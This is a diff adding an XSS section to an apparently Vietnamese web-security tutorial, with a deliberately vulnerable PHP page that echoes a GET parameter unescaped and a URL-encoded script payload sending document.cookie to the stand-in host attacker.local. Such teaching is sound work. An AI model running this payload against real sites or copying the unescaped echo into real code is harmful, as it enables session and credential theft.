@@ -189,5 +189,50 @@ var x = document.getElementsByClassName("example");
 
 Hãy bỏ một buổi sáng ra lên w3schools làm theo các hướng dẫn là tôi nghĩ bạn đã khá thành thục javascript rồi.
 
-## Cross Site Scripting (XSS) là gì?
+## Cross Site Scripting là gì?
+
+Cross site scripting (aka XSS): Là kiểu tấn công mà người khai thác chèn các đoạn script độc hại (Thường là Javascript) vào ứng dụng web phía người dùng và trình duyệt sẽ thực thi nó giống như từ trusted site. Kết quả là ứng dụng web sẽ thực hiện các hành động theo ý định của người khai thác.\
+
+Nói thì thật khó hiểu, để đơn giản lấy ví dụ:
+
+Giả sử ta có đoạn code sau:
+```
+<!DOCTYPE html>
+<html>
+<head>
+   <title></title>
+</head>
+<body>
+   <?php
+      setcookie("username", "admin", time()+30*24*60*60);
+      setcookie("password", "123qwea@", time()+30*24*60*60);
+
+      if (isset($_GET['name']) && !empty($_GET['name'])) {
+         $name = $_GET['name'];
+         echo "Welcome $name<br>"; 
+      }
+   ?>
+</body>
+</html> 
+```
++ Bình thường ta truyền vào name qua biến GET như sau:
+```
+http://site1.local/tut4/index.php?name=toan
+```
+Kế quả sẽ trả lại là 
+![URL get]( {{site.url}}/assets/img/2021/05/17/210517_url_get.JPG){:width="500px"}
+
++ Tuy nhiên cải biên một chút ta lại truyền vào như sau:
+```
+http://site1.local/tut4/index.php?name=%3Cscript%3Edocument.write(%27%3Cimg%20src=%22http://attacker.local/index.php?c=%27%2bdocument.cookie%2b%27%22%20/%3E%27);%3C/script%3E
+```
+Kết quả trả lại sẽ là redirect sang trang 
+
+![URL get2]( {{site.url}}/assets/img/2021/05/17/210517_url_get2.JPG){:width="500px"}
+
+Nhưng khi soi log access của trang attacker.local (URL mà ta truyền vào payload) sẽ thấy
+
+![URL get3]( {{site.url}}/assets/img/2021/05/17/210517_url_get3.JPG){:width="500px"}
+
+Rõ ràng là ta đã lấy được toàn bộ dữ liệu cookie của trang web. 
 
